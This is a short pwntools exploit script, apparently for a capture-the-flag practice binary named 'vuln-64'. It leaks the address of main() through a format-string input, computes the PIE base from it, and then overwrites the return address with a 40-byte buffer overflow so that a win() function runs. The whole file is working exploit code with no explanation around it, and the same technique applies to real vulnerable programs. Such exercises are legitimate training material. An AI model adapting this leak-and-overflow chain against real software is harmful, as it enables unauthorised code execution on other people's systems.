from pwn import *

context.binary = elf = ELF('./vuln-64')
context.log_level = 'debug'
p = process()

# Step 1: Leak address of main()
p.recvuntil('name?\n')
p.sendline('%15$p')

p.recvuntil('you ')
leak = p.recvline().strip()
elf_leak = int(leak, 16)
log.success(f"Leaked address of main(): {hex(elf_leak)}")

# Step 2: Calculate PIE base
elf.address = elf_leak - elf.symbols['main']
log.success(f"PIE base address: {hex(elf.address)}")

# Step 3: Build payload to call win()
payload = b'A' * 40
payload += p64(elf.sym['win'])

# Step 4: Send payload
p.recvuntil('message?\n')
p.sendline(payload)

# Step 5: Output result
print(p.clean().decode(errors='ignore'))
